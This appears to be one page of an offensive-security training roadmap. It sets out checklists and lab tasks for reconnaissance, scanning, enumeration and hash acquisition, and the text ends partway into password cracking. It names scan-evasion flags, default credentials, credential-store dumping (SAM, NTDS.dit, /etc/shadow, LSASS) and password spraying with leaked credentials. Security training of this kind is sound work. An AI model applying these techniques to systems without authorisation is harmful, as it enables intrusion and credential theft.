+# Phase 2: Offensive Core

---

### 🧭 Navigation

◀ [Phase 1](Phase-1.md) | 🏠 [Master Roadmap](README.md) | [Phase 3](Phase-3.md) ➔

---

> [!NOTE]
> **Phase Overview**
>
> - **⏱️ Time Commitment (Full-Time):** 5–7 months
> - **⏱️ Time Commitment (Part-Time):** 8–12 months
> - **🎯 Primary Focus:** The complete offensive lifecycle from recon to impact. Split into two sub-phases: **Phase 2A** (Offensive Fundamentals — recon, scanning, enumeration, credential attacks, system hacking) and **Phase 2B** (Advanced Offensive Operations — malware, sniffing/spoofing, social engineering, denial-of-service, session hijacking).

---

> [!NOTE]
>
> ### 📝 Phase 2 Documentation Requirements
>
> Every attack you execute must be documented. Required artifacts:
>
> - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
> - **Tool output** — Nmap scans, Burp captures, Metasploit session logs saved to files
> - **Attack chain diagrams** showing the kill chain for each compromise
> - **3 HTB/VulnHub writeups** — full writeups committed to Git (private until published)
> - **Git commits** — commit after every lab session with descriptive messages
>
> _By the end of Phase 2, you should have 10+ documented attack chains in your repository._

---

### 🗂️ Table of Contents

- [Part 4: Footprinting and Reconnaissance](#part-4-footprinting-and-reconnaissance)
  - [Stage 1: The "Ghost" Phase (Passive OSINT & Human Profiling)](#part-4-stage-1-ghost-phase)
  - [Stage 2: Semi-Passive Infrastructure Mapping](#part-4-stage-2-semi-passive-infrastructure-mapping)
  - [Stage 3: Active Footprinting & Network Interrogation](#part-4-stage-3-active-footprinting-network-interrogation)
  - [Stage 4: Advanced Fingerprinting & Logic Analysis](#part-4-stage-4-advanced-fingerprinting-logic-analysis)
  - [Stage 5: IPv6 & Protocol Enumeration](#part-4-stage-5-ipv6-protocol-enumeration)
  - [Stage 6: Dark Web & Breach Intelligence](#part-4-stage-6-dark-web-breach-intelligence)
  - [Stage 7: Satellite & Geospatial Intelligence](#part-4-stage-7-satellite-geospatial-intelligence)
  - [Stage 8: Strategy & Attack Mapping](#part-4-stage-8-strategy-attack-mapping)
  - [Lab Progression (Part 4: Footprinting and Reconnaissance)](#part-4-lab-progression)
- [Part 5: Scanning](#part-5-scanning)
  - [Stage 1: Host Discovery & Network Topology (The "Roll Call")](#stage-1-host-discovery-network-topology-the-roll-call)
  - [Stage 2: Port, Service & Protocol Enumeration (The "Door Check")](#stage-2-port-service-protocol-enumeration-the-door-check)
  - [Stage 3: Defense & Co
    nfiguration Assessment (The "Armor Check")](#stage-3-defense-configuration-assessment-the-armor-check)
  - [Stage 4: Vulnerability Association & Attack Mapping](#stage-4-vulnerability-association-attack-mapping)
  - [Stage 5: Stealth & Evasion Techniques](#stage-5-stealth-evasion-techniques)
  - [Stage 6: Advanced Scanning Techniques](#stage-6-advanced-scanning-techniques)
  - [Lab Progression (Part 5: Scanning)](#lab-progression-part-5-scanning)
- [Part 6: Enumeration](#part-6-enumeration)
  - [Stage 1: Service Enumeration & Banner Grabbing](#stage-1-service-enumeration-banner-grabbing)
  - [Stage 2: Directory & Identity Enumeration](#stage-2-directory-identity-enumeration)
  - [Stage 3: DNS & Infrastructure Enumeration](#stage-3-dns-infrastructure-enumeration)
  - [Stage 4: Database & Application Enumeration](#stage-4-database-application-enumeration)
  - [Stage 5: Attack Surface Consolidation & Enumeration OpSec](#stage-5-attack-surface-consolidation-enumeration-opsec)
  - [Lab Progression (Part 6: Enumeration)](#lab-progression-part-6-enumeration)
- [Part 31: Password Cracking & Hash Analysis](#part-31-password-cracking-hash-analysis)
  - [Stage 1: Hash Identification & Acquisition](#stage-1-hash-identification-acquisition)
  - [Stage 2: Cracking Methodology & Tools](#stage-2-cracking-methodology-tools)
  - [Stage 3: Protocol-Specific Cracking](#stage-3-protocol-specific-cracking)
  - [Stage 4: Wordlist & Intelligence Curation](#stage-4-wordlist-intelligence-curation)
- [Part 7: System Hacking & Initial Compromise](#part-7-system-hacking-initial-compromise)
  - [Stage 1: The Breach (Initial Access & Exploitation)](#stage-1-the-breach-initial-access-exploitation)
  - [Stage 2: The Ascension (Privilege Escalation)](#stage-2-the-ascension-privilege-escalation)
  - [Stage 3: The Stronghold (Persistence & Lateral Movement)](#stage-3-the-stronghold-persistence-lateral-movement)
  - [Stage 4: The Shadow (Defense Evasion & Anti-Forensics)](#stage-4-the-shadow-defense-evasion-anti-forensics)
  - [Stage 5: Data Exfiltration & Impact](#stage-5-data-exfiltration-impact)
  - [Stage 6: The Professional (Governance & Reporting)](#stage-6-the-professional-governance-reporting)
  - [Lab Progression (Part 7: System Hacking & Initial Compromise)](#lab-progression-part-7-system-hacking-initial-compromise)
- [Part 8: Malware & Weaponization](#part-8-malware-weaponization)
  - [Stage 1: The Design & Logic (Architecture)](#stage-1-the-design-logic-architecture)
  - [Stage 2: The Payload & Mechanism (Weaponization)](#stage-2-the-payload-mechanism-weaponization)
  - [Stage 3: Evasion & Defense Bypassing (Invisibility)](#stage-3-evasion-defense-bypassing-invisibility)
  - [Stage 4: Persistence & Escalation (Entrenchment)](#stage-4-persistence-escalation-entrenchment)
  - [Stage 5: Counter-Forensics & Professionalism (The Cleanup)](#stage-5-counter-forensics-professionalism-the-cleanup)
  - [Stage 6: Document & Cloud Weaponization](#stage-6-document-cloud-weaponization)
- [Part 9: Sniffing & Spoofing](#part-9-sniffing-spoofing)
  - [Stage 1: The Environment & Fundamentals (The Setup)](#stage-1-the-environment-fundamentals-the-setup)
  - [Stage 2: Sniffing & Passive Reconnaissance (The Ear)](#stage-2-sniffing-passive-reconnaissance-the-ear)
  - [Stage 3: Spoofing & Active Deception (The Lie)](#stage-3-spoofing-active-deception-the-lie)
  - [Stage 4: Man-in-the-Middle & Exploitation (The Kill)](#stage-4-man-in-the-middle-exploitation-the-kill)
  - [Stage 5: Defenses & Mitigation (The Shield)](#stage-5-defenses-mitigation-the-shield)
  - [Lab Progression (Part 9: Sniffing & Spoofing)](#lab-progression-part-9-sniffing-spoofing)
- [Part 10: Social Engineering](#part-10-social-engineering)
  - [Stage 1: Intelligence & Reconnaissance (The Setup)](#stage-1-intelligence-reconnaissance-the-setup)
  - [Stage 2: The Digital Assault (Remote Vectors)](#stage-2-the-digital-assault-remote-vectors)
  - [Stage 3: The Human Element (Direct Interaction)](#stage-3-the-human-element-direct-interaction)
  - [Stage 4: The Physical Breach (Boots on the Ground)](#stage-4-the-physical-breach-boots-on-the-ground)
  - [Stage 5: Defense & Awareness (The Shield)](#stage-5-defense-awareness-the-shield)
  - [Lab Progression (Part 10: Social Engineering)](#lab-progression-part-10-social-engineering)
- [Part 11: Denial of Service](#part-11-denial-of-service)
  - [Stage 1: Objective & Strategy (The Planning)](#stage-1-objective-strategy-the-planning)
  - [Stage 2: The Arsenal (Attack Methods)](#stage-2-the-arsenal-attack-methods)
  - [Stage 3: Infrastructure & Execution (The Assault)](#stage-3-infrastructure-execution-the-assault)
  - [Stage 4: Defense & Mitigation (The Shield)](#stage-4-defense-mitigation-the-shield)
  - [Lab Progression (Part 11: Denial of Service)](#lab-progression-part-11-denial-of-service)
- [Part 12: Session Hijacking](#part-12-session-hijacking)
  - [Stage 1: Reconnaissance & Vulnerability Analysis](#stage-1-reconnaissance-vulnerability-analysis)
  - [Stage 2: Stealing the Session ID (The Attack Vectors)](#stage-2-stealing-the-session-id-the-attack-vectors)
  - [Stage 3: Execution & Impersonation](#stage-3-execution-impersonation)
  - [Stage 4: Defense & Mitigation (The Shield)](#stage-4-defense-mitigation-the-shield)
  - [Lab Progression (Part 12: Session Hijacking)](#lab-progression-part-12-session-hijacking)

---

## 🔹 Phase 2A: Offensive Fundamentals

> _Parts 4–7 + 31 — Learn to find, probe, crack, and compromise targets. This is the core recon-to-shell pipeline._

---

<a id="part-4-footprinting-and-reconnaissance"></a>

## Part 4: Footprinting and Reconnaissance

<a id="part-4-stage-1-ghost-phase"></a>

### **Stage 1: The "Ghost" Phase (Passive OSINT & Human Profiling)**

> [!TIP]
> **Goal:** Maximum data acquisition with zero target interaction.

- [x] **Organizational Hierarchy:** Profile the **Audience** (Stakeholders, HR, Legal, Management) to understand who holds the keys and who is the weakest link.

- [ ] **Search Engine Hacking:** Use **Google Dorks** (`site:`, `filetype:`, `intitle:`) to find exposed documents and login portals.

- [ ] **Social Vector Mapping:** Scrape LinkedIn and professional sites to identify targets for **Phishing, Whishing, Whaling, or Smishing** based on reported tech stacks.

- [ ] **Physical Perimeter Assessment:** Evaluate the likelihood of **Shoulder Surfing, Tailgating, or Dumpster Diving** vulnerabilities.

- [ ] **Metadata & Leak Analysis:** Use **Wayback Machine** for historical paths and **GitHub/GitLab Dorking** for hardcoded API keys or internal naming conventions.

- [ ] **Domain & Ownership:** Perform **WHOIS Lookups** to identify registration dates, contact info, and associated subdomains.

- [ ] **Passive DNS & CT:** Pull **passive DNS** and **Certificate Transparency (crt.sh)** to surface shadow subdomains and SANs; cluster hosting/ASN/country.

- [ ] **Breach & Paste Monitoring:** Check **breach corpuses** (HIBP/Dehashed) and pastes/code search for leaked creds, API keys, or internal hostnames.

- [ ] **Mail Posture Recon:** Review **SPF/DMARC/DKIM** to assess spoofing risk and likely mail providers.

---

<a id="part-4-stage-2-semi-passive-infrastructure-mapping"></a>

### **Stage 2: Semi-Passive Infrastructure Mapping**

> [!TIP]
> **Goal:** Querying third-party aggregators to see what the world already knows about them.

- [ ] **External Intel Scouring:** Query **VirusTotal, urlscan, any.run, Joe Sandbox, and urlvoid** for existing malware samples or documented domain behavior.

- [ ] **Third-Party Scans:** Use **Shodan & Censys** to find open ports, outdated services, and geographical distribution without scanning the target yourself.

- [ ] **Subdomain & DNS Enumeration:** Use **Sublist3r/Amass** for subdomains and check **DNS records** (MX, TXT, NS) to map mail providers and third-party integrations.

- [ ] **Protocol Audit:** Identify if the target is clinging to **Insecure Protocols** (FTP vs. SFTP, SSL vs. TLS).

- [ ] **WAF/CDN/TLS Fingerprinting:** Detect **WAF/CDN** fronting via **JA3/JA4, HTTP header quirks, TLS ALPN/HTTP2**, and favicon hashes.

- [ ] **VHost & Favicon Hunts:** Bruteforce **vhosts/domains** and use **favicon hash**/HTTP header diffs to find hidden apps.

---

<a id="part-4-stage-3-active-footprinting-network-interrogation"></a>

### **Stage 3: Active Footprinting & Network Interrogation**

> [!TIP]
> **Goal:** Direct contact to map the live network fabric. Risk of detection is now ACTIVE.

- [ ] **Live Host Discovery:** Use **ping, arp, and hping** to identify which internal or external assets are actually breathing.

- [ ] **Network Path Analysis:** Use **tracert** to map the hops and identify **Perimeter vs. DMZ vs. Segmentation** boundaries.

- [ ] **Surgical Port Scanning:** Execute **Nmap Essentials** (starting with `-sS` stealth scans) to identify listening services and **OS Fingerprinting**.

- [ ] **Aggressive DNS Interrogation:** Use **nslookup and dig** to force the disclosure of hidden internal records or mail servers.

- [ ] **Web Content Discovery:** Run **ffuf or Gobuster** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).

- [ ] **TLS Surface:** Harvest **cert SANs**, check **cipher/curve** support, **HTTP/2/ALPN** negotiation, and redirect/downgrade behavior.

- [ ] **Web Route Mapping:** Parse **robots.txt/sitemap.xml** and fuzz **parameters/paths** with status/length filters to uncover hidden routes.

---

<a id="part-4-stage-4-advanced-fingerprinting-logic-analysis"></a>

### **Stage 4: Advanced Fingerprinting & Logic Analysis**

> [!TIP]
> **Goal:** Understand the defensive "brain" of the target.

- [ ] **Traffic Analysis:** If vantage is gained, use **Wireshark** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.

- [ ] **Defensive Profiling:** Identify the presence of **IDS/IPS, SIEM, SOAR, and EDR/DLP**. If found, slow down your operation immediately.

- [ ] **Unintended Binary Research:** Map the target's OS to potential **LOLBAS, GTFOBins, or WADCOMS** vectors for later movement. _(See Part 7, Phase 2 for canonical LOLBAS/GTFOBins coverage.)_

- [ ] **Version-to-CVE Correlation:** Cluster hosts by **banners/JA3/favicons** and map exposed versions to **CVE** candidates before exploitation.

---

<a id="part-4-stage-5-ipv6-protocol-enumeration"></a>

### **Stage 5: IPv6 & Protocol Enumeration**

> [!TIP]
> **Goal:** Discover targets using newer protocols and dual-stack networks.

- [ ] **IPv6 Reconnaissance:** Identify **IPv6 addresses** via **Shodan, Censys, IPv6 address enumeration tools** even when IPv4 is locked down.

- [ ] **Link-Local Discovery:** Scan for **link-local addresses** to discover local IPv6 devices and address schemes.

- [ ] **DHCPv6 Enumeration:** Use **DHCPv6 client** to extract **prefix, DNS servers, domain names** from DHCP responses.

- [ ] **SNMP Enumeration:** Query **SNMP community strings** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.

- [ ] **LDAP Probing:** Query **LDAP** on **port 389** to enumerate **users, groups, organizational structure, computer objects**.

- [ ] **NFS Shares:** Probe for **NFS exports** on **port 2049** and attempt to mount for **file enumeration and exfiltration**.

- [ ] **RPC Enumeration:** Use **rpcclient, nmap NSE** to interrogate **RPC services** on **port 135/445** for **users, groups, shares**.

---

<a id="part-4-stage-6-dark-web-breach-intelligence"></a>

### **Stage 6: Dark Web & Breach Intelligence**

> [!TIP]
> **Goal:** Uncover intelligence from dark web and historical breaches.

- [ ] **Dark Web Searches:** Use **Tor, I2P**, or dedicated **dark web search engines** to find **leaked corporate data, stolen creds, threat reports**.

- [ ] **Breach Corpus Searching:** Query **Dehashed, Have I Been Pwned, Shodan**, and **breach databases** for **employee emails, leaked credentials, domain info**.

- [ ] **Threat Actor Profiling:** Identify relevant **APT groups, cybercrime forums, adversary tradecraft** that target your industry.

- [ ] **Ransomware Gang Sites:** Monitor **ransomware operator sites** for **leaked data, victim announcements, negotiation demands**.

- [ ] **Credential Stuffing Data:** Leverage **leaked cred combos** for **password spray, targeted phishing, VPN/email access**.

---

<a id="part-4-stage-7-satellite-geospatial-intelligence"></a>

### **Stage 7: Satellite & Geospatial Intelligence**

> [!TIP]
> **Goal:** Use geospatial data to understand physical assets and infrastructure.

> [!NOTE]
> **Scope Clarification — This Stage vs. Phase 5 SDR/GPS:**
> This stage covers **passive OSINT using publicly available satellite imagery and geospatial data** — no special hardware required, no restricted frequencies, no legal complexity. Tools like Google Earth Pro, Sentinel Hub, and IP geolocation are legitimate free resources used by security consultants for physical site reconnaissance.
>
> This is **entirely distinct** from Phase 5 Stage 7 (GPS Spoofing & Satellite Protocol Security), which is marked **[OPTIONAL]** because it requires specialized hardware (HackRF, GPSDO), operates in restricted RF spectrum, and is a narrow specialization relevant only to specific career paths (aviation security, IoT/V2X, critical infrastructure). If you see the word "satellite" in Phase 5 and think you already covered it here — you have not. These are different domains.

- [ ] **Satellite Imagery:** Use **Google Earth Pro, Sentinel Hub, USGS Earth Explorer, Maxar Open Data** to visualize **data center locations, server rooms, facility perimeters, parking patterns, physical security posture** — all from open, publicly available imagery.

- [ ] **Physical Facility Assessment via OSINT:** Combine satellite imagery with **LinkedIn employee location data, job postings (mentioning physical location), Google Street View, and building permit records** to map the physical attack surface of a target facility before an authorized physical pentest engagement.

- [ ] **Geolocation Triangulation:** Combine **IP geolocation, BGP origin, ASN info** to identify **likely hosting providers and data center countries**. Use **ipinfo.io, bgp.he.net, PeeringDB** to map provider relationships.

- [ ] **Signal Intelligence (SIGINT) — Passive Only:** Use **RF mapping tools (Wigle.net for WiFi mapping, Shodan for internet-exposed infrastructure, GreyNoise for internet noise)** to identify **telecommunications infrastructure** from open data sources — no hardware required.

- [ ] **Infrastructure Clustering:** Map **AS numbers, IP blocks, DNS servers** to identify **shared hosting clusters, CDN nodes, provider boundaries**.

---

<a id="part-4-stage-8-strategy-attack-mapping"></a>

### **Stage 8: Strategy & Attack Mapping**

> [!TIP]
> **Goal:** Convert raw data into an execution plan.

- [ ] **Security Architecture Classification:** Determine if they are utilizing **Zero Trust** or standard **MFA & 2FA**.

- [ ] **Framework Alignment:** Map your findings against the **Cyber Kill Chain, Diamond Model, or MITRE ATT&CK**.

- [ ] **Vulnerability Finalization:** Decide the entry vector based on recon: **SQL Injection, MITM, or Brute Force**.

---

<a id="part-4-lab-progression"></a>

### **Lab Progression (Part 4: Footprinting and Reconnaissance)**

| Level | Task                                                                    | Deliverable                                                     |
| ----- | ----------------------------------------------------------------------- | --------------------------------------------------------------- |
| 1     | Perform passive recon on a bug bounty target using only OSINT tools     | Reconnaissance report (domains, subdomains, emails, tech stack) |
| 2     | Use Google Dorks to find exposed files on a permitted target            | Dork queries + findings document                                |
| 3     | Enumerate subdomains using 3+ tools (Sublist3r, Amass, crt.sh)          | Combined subdomain list with deduplication                      |
| 4     | Map a target's full DNS infrastructure (MX, NS, TXT, CNAME)             | DNS map diagram                                                 |
| 5     | Perform active recon on a home lab target (traceroute, banner grabbing) | Active recon report                                             |

> [!IMPORTANT]
> **Move-On Gate:** You can produce a complete reconnaissance report on an unfamiliar target using both passive and active techniques, identify the technology stack, and prioritize attack surface areas.

---

<a id="toc-part-5-scanning"></a>
<a id="part-5-scanning"></a>

## Part 5: Scanning

<a id="stage-1-host-discovery-network-topology-the-roll-call"></a>

### **Stage 1: Host Discovery & Network Topology (The "Roll Call")**

> [!TIP]
> **Goal:** Identify live assets without wasting time on dead IPs or triggering ICMP alarms.

- [ ] **ARP Discovery:** Use `arp-scan` or `nmap -PR` for local segment discovery to bypass host firewalls that drop ICMP.

- [ ] **ICMP & TCP/UDP Sweeps:** Perform standard `ping` sweeps or use `nmap -PS/-PU` (ports 80, 443, 53) to find external hosts that block standard pings.

- [ ] **Passive Traffic Capture:** Utilize **Wireshark** to capture broadcast traffic, revealing active hosts without sending a single packet.

- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `hping3 --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.

- [ ] **IPv6 Discovery:** Include **NDP/`nmap -6`** sweeps for dual-stack assets and SLAAC-derived hosts.

---

<a id="stage-2-port-service-protocol-enumeration-the-door-check"></a>

### **Stage 2: Port, Service & Protocol Enumeration (The "Door Check")**

> [!TIP]
> **Goal:** Determine exactly what applications are running and how they communicate.

- [ ] **Stealth SYN Scanning:** Use `nmap -sS` to identify open ports without completing the three-way **Handshake**, minimizing your footprint in application logs.

- [ ] **Version & OS Fingerprinting:** Deploy `nmap -sV` for service banners and `nmap -O` to analyze TCP/IP stack responses for **Operating System Hardening** clues.

- [ ] **Protocol Audit:** Analyze discovered services to determine if they use **Secure vs Insecure Protocols** (e.g., FTP vs SFTP, SSL vs TLS).

- [ ] **Connection Handshake Analysis:** Examine **Handshakes** to understand the specific authentication and encryption methods protecting the service.

- [ ] **UDP Surface Check:** Do not ignore `nmap -sU` for often-overlooked services like DNS (53), SNMP (161), and DHCP (67).

- [ ] **Timing & Hygiene:** Apply sane **-T profiles**, exclusion lists, and prefer **safe NSE** scripts before vuln categories to avoid tripping controls.

- [ ] **IPv6 Stack:** Mirror key scans with **`nmap -6`** for IPv6 services.

---

<a id="stage-3-defense-configuration-assessment-the-armor-check"></a>

### **Stage 3: Defense & Configuration Assessment (The "Armor Check")**

> [!TIP]
> **Goal:** Identify security controls that will attempt to block or alert on your presence.

- [ ] **Firewall & ACL Enumeration:** Detect the presence of a **Firewall & Nextgen Firewall** or **Host Based Firewalls** by analyzing filtered ports and **ACL** (Access Control List) behavior.

- [ ] **IDS/IPS Probing:** Use fragmentation (`-f`) or timing decoys (`-D`) to identify active **NIDS, NIPS, or HIPS** systems that may block aggressive patterns.

- [ ] **Web Surface Discovery:** Use `ffuf` or `Gobuster` for **Directory Brute-forcing** to find hidden `/admin` or `/config` panels that are not linked publicly.

- [ ] **Service-Specific Enum:** Targeted checks for **SMB/RPC/WinRM**, **LDAP/Kerberos (AS-REP preauth, SPNs)**, **SNMP v1/v2c/v3**, **SMTP VRFY/EXPN**, **SSH KEX/ciphers**, **RDP/NLA**, **DBs (MySQL/MSSQL/Postgres)**, **Redis/Mongo/Elastic**.

---

<a id="stage-4-vulnerability-association-attack-mapping"></a>

### **Stage 4: Vulnerability Association & Attack Mapping**

> [!TIP]
> **Goal:** Convert raw scan data into actionable exploitation vectors.

- [ ] **Scripted Vulnerability Probing:** Use the **Nmap Scripting Engine (NSE)** (`--script vuln`) to check for known **Zero Day** or common exploits in identified versions.

- [ ] **Attack Surface Selection:** Match findings to your known **Common Attacks**—e.g., **SQL Injection** for web servers or **Buffer Overflows** for legacy binaries.

- [ ] **Unintended Tool Research:** For discovered OS versions, research **LOLBAS, GTFOBins, or WADCOMS** to leverage existing system binaries for lateral movement. _(See Part 7, Phase 2 for canonical LOLBAS/GTFOBins coverage.)_

- [ ] **Traffic Intelligence:** Finalize your plan by inspecting **Packet Captures** for cleartext protocols or weak encryption that allows for **MITM** or **Replay Attacks**.

- [ ] **Cluster & Correlate:** Group hosts by **banners/JA3/favicons** and map versions to likely **CVEs** before exploitation.

---

<a id="stage-5-stealth-evasion-techniques"></a>

### **Stage 5: Stealth & Evasion Techniques**

> [!TIP]
> **Goal:** Scan without detection by firewalls, IDS, and EDR.

- [ ] **Fragmentation & Decoys:** Use `nmap -f` (fragment packets) or `-D` (decoy IPs) to evade **NIDS/NIPS signature detection**.

- [ ] **Timing Profiles:** Apply appropriate `-T` profile (T0-T5) to avoid triggering **rate-based IDS rules** or **adaptive firewalls**.

- [ ] **Null/FIN/Xmas Scans:** Use alternative scan types (`nmap -sN/-sF/-sX`) that bypass **stateless firewalls** but may not work through **stateful firewalls**.

- [ ] **ACK Scanning:** Use `-sA` to map **firewall rule sets** without attempting to establish connections.

- [ ] **Idle/Zombie Scanning:** Use `-sI` with a **zombie host** to perform **blind port scans** that don't directly originate from your IP.

- [ ] **Source Port Spoofing:** Use `--source-port 53/80` to impersonate **DNS/HTTP traffic** and bypass port-based **ACL rules**.

- [ ] **Packet Manipulation:** Craft **custom packets** with **Scapy** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.

---

<a id="stage-6-advanced-scanning-techniques"></a>

### **Stage 6: Advanced Scanning Techniques**

> [!TIP]
> **Goal:** Optimize scanning efficiency and discover hidden services.

- [ ] **Parallel & Distributed Scanning:** Use **masscan** for rapid scanning of large ranges; distribute scans across **multiple IPs/proxies** to avoid threshold detection.

- [ ] **Custom Probes & NSE Scripting:** Write **NSE scripts** for **service-specific probing** (e.g., extracting **SANs from TLS**, **banner grabbing**, **service enumeration**).

- [ ] **WAF/CDN Bypass:** Identify backend IPs via **DNS history, SSL cert mismatches, HTTP header fingerprints**, and scan directly if possible.

- [ ] **Certificate Transparency (CT) Recon:** Parse **CT logs** to discover **hidden subdomains, domain variants, and organization structure**.

- [ ] **Reverse DNS Lookup:** Use **reverse DNS** to discover **vhosts, services, and hostnames** associated with IP ranges.

- [ ] **Proxychains & Proxy Pivoting:** Route scans through **VPNs, proxies, compromised hosts** to obscure source IP and bypass **geographic restrictions**.

<a id="lab-progression-part-5-scanning"></a>

### **Lab Progression (Part 5: Scanning)**

| Level | Task                                                          | Deliverable                     |
| ----- | ------------------------------------------------------------- | ------------------------------- |
| 1     | Scan a home lab subnet with Nmap (host discovery + port scan) | Nmap output report              |
| 2     | Perform service version detection and OS fingerprinting       | Annotated scan results          |
| 3     | Write a custom NSE script to detect a specific vulnerability  | Working .nse script             |
| 4     | Scan a target through a proxy chain / VPN tunnel              | Scan results + stealth analysis |
| 5     | Compare scan results with and without IDS evasion techniques  | Evasion effectiveness report    |

> [!IMPORTANT]
> **Move-On Gate:** You can discover all live hosts and open ports on a /24 subnet, identify service versions and OS types, and adapt scan techniques to evade basic IDS detection.

---

<a id="toc-part-6-enumeration"></a>
<a id="part-6-enumeration"></a>

## Part 6: Enumeration

> [!NOTE]
> **Note:** Part 5 (Scanning) covers host discovery, port scanning, and defense identification. Part 6 focuses specifically on **extracting detailed information from discovered services** to build an attack profile. If you haven't completed Part 5, do so first.

<a id="stage-1-service-enumeration-banner-grabbing"></a>

### **Stage 1: Service Enumeration & Banner Grabbing**

> [!TIP]
> **Goal:** Extract version, configuration, and identity information from each discovered service.

- [ ] **Banner Grabbing:** Use **Netcat, Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.

- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, CrackMapExec** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.

- [ ] **SNMP Enumeration:** Query **SNMP (UDP 161)** with **snmpwalk, onesixtyone** using **community strings (public/private)** to extract **system info, interfaces, running processes, installed software**.

- [ ] **NFS Enumeration:** Use **showmount -e** to discover **exported shares**; check for **world-readable exports** and **root squash misconfigurations**.

- [ ] **SSH Enumeration:** Fingerprint **SSH versions, supported algorithms, key exchange methods** using **ssh-audit**; identify **weak ciphers, deprecated protocols**.

- [ ] **RDP Enumeration:** Use **nmap --script rdp-enum-encryption, rdp-ntlm-info** to extract **OS version, domain info, NLA requirements** from RDP endpoints.

---

<a id="stage-2-directory-identity-enumeration"></a>

### **Stage 2: Directory & Identity Enumeration**

> [!TIP]
> **Goal:** Map users, groups, and organizational structure from directory services.

- [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.

- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, BloodHound** to map **domain trusts, group membership, SPNs, delegation**.

- [ ] **Kerberos Enumeration:** Use **kerbrute** for **username enumeration** via **AS-REQ responses**; identify **accounts without pre-authentication (AS-REP Roastable)**.

- [ ] **SMTP Enumeration:** Use **VRFY, EXPN, RCPT TO** commands to **verify valid email addresses and usernames** on mail servers.

- [ ] **RPC Enumeration:** Use **rpcclient, rpcinfo** to enumerate **RPC endpoints, user SIDs, domain information, printer shares**.

---

<a id="stage-3-dns-infrastructure-enumeration"></a>

### **Stage 3: DNS & Infrastructure Enumeration**

> [!TIP]
> **Goal:** Extract naming, network, and infrastructure intelligence from DNS.

- [ ] **DNS Zone Transfer:** Attempt **AXFR/IXFR** transfers to extract **full DNS records** and internal hostnames.

- [ ] **DNS Record Enumeration:** Query **A, AAAA, MX, TXT, SRV, CNAME, NS, PTR** records to map **mail servers, services, subdomains, SPF/DMARC/DKIM** policies.

- [ ] **DNS Spoofing Prep:** Identify **DNS split-view** configurations and **internal domain naming** for **DNS rebinding attacks**.

- [ ] **Reverse DNS Sweeps:** Perform **PTR record lookups** across discovered IP ranges to reveal **hostnames, naming conventions, and hidden services**.

---

<a id="stage-4-database-application-enumeration"></a>

### **Stage 4: Database & Application Enumeration**

> [!TIP]
> **Goal:** Extract schemas, credentials, and data from discovered database and application services.

- [ ] **Database Discovery:** Identify **MySQL, MSSQL, PostgreSQL, Oracle, MongoDB, Redis, Elasticsearch** on standard/non-standard ports.

- [ ] **Database Default Creds:** Test **default credentials** (root/password, sa/sa, admin/admin) against discovered databases.

- [ ] **Database Information Schema:** Query **INFORMATION_SCHEMA** tables to enumerate **user accounts, object permissions, stored procedures**.

- [ ] **Backup & Recovery:** Identify **backup locations, recovery mode**, and **log files** that may contain **plaintext passwords or recovery keys**.

- [ ] **Web Application Enumeration:** Use **Gobuster, feroxbuster, ffuf** to discover **hidden directories, API endpoints, admin panels, configuration files, and backup archives** (.bak, .old, .swp).

---

<a id="stage-5-attack-surface-consolidation-enumeration-opsec"></a>

### **Stage 5: Attack Surface Consolidation & Enumeration OpSec**

> [!TIP]
> **Goal:** Consolidate findings into an attack plan while maintaining stealth.

- [ ] **Attack Surface Map:** Combine all enumeration results into a **structured target profile** — users, credentials, shares, services, misconfigurations, and potential exploitation vectors.

- [ ] **Prioritized Attack Paths:** Rank targets by **exploitability and impact** — prioritize **null sessions, default credentials, writable shares, exposed admin panels, and AS-REP Roastable accounts**.

- [ ] **Tool Fingerprinting Awareness:** Understand that enumeration tools leave signatures — **vary User-Agents, throttle requests, rotate source IPs** where possible.

- [ ] **Timing Discipline:** Spread enumeration queries over time; avoid **rapid-fire LDAP/SMB/SNMP queries** that trigger **anomaly-based detection**.

- [ ] **Documentation:** Record all findings with **timestamps, source IPs, and tool commands** used — this feeds directly into **reporting and evidence collection**.

<a id="lab-progression-part-6-enumeration"></a>

### **Lab Progression (Part 6: Enumeration)**

| Level | Task                                                         | Deliverable                                    |
| ----- | ------------------------------------------------------------ | ---------------------------------------------- |
| 1     | Enumerate SMB shares and users on a Windows lab target       | Enumeration findings document                  |
| 2     | Enumerate SNMP on a network device (community strings, MIBs) | SNMP data export                               |
| 3     | Perform full LDAP enumeration against a lab AD domain        | User/group/OU listing                          |
| 4     | Enumerate DNS zone transfers and subdomain brute-forcing     | DNS enumeration report                         |
| 5     | Build a complete attack surface map from enumeration data    | Attack profile document with prioritized paths |

> [!IMPORTANT]
> **Move-On Gate:** You can enumerate services, users, shares, and misconfigurations across SMB, LDAP, SNMP, DNS, and web services, and produce a prioritized attack surface map.

---

<a id="part-31-password-cracking-hash-analysis"></a>

## Part 31: Password Cracking & Hash Analysis

> [!NOTE]
> **Navigational Note — Why Part 31 Is Here:** Part 31 is numbered non-sequentially (Parts 4–6, then 31, then 7–...) because it was added to Phase 2 after the original numbering scheme was established. It sits here — between Part 6 (Enumeration) and Part 7 (System Hacking) — because password cracking is a **direct prerequisite for Part 7**: you cannot use Pass-the-Hash, Kerberoasting, or credential-based lateral movement without first understanding hash types, cracking methodology, and offline attack mechanics. Parts 8–30 do not exist in Phase 2 — they are in later phases. Continue to Part 7 after completing this.

<a id="stage-1-hash-identification-acquisition"></a>

### **Stage 1: Hash Identification & Acquisition**

> [!TIP]
> **Goal:** Identify what you have before cracking.

- [ ] **Hash Identification:** Use **hashid, hash-identifier, Name-That-Hash** to identify algorithm from hash format (length, prefix like `$2y$`, `$6$`, `$NT$`).

- [ ] **Hash Acquisition:** Obtain hashes from **SAM/NTDS.dit (Windows), /etc/shadow (Linux), database dumps, LSASS memory, pcap files, web app source**.

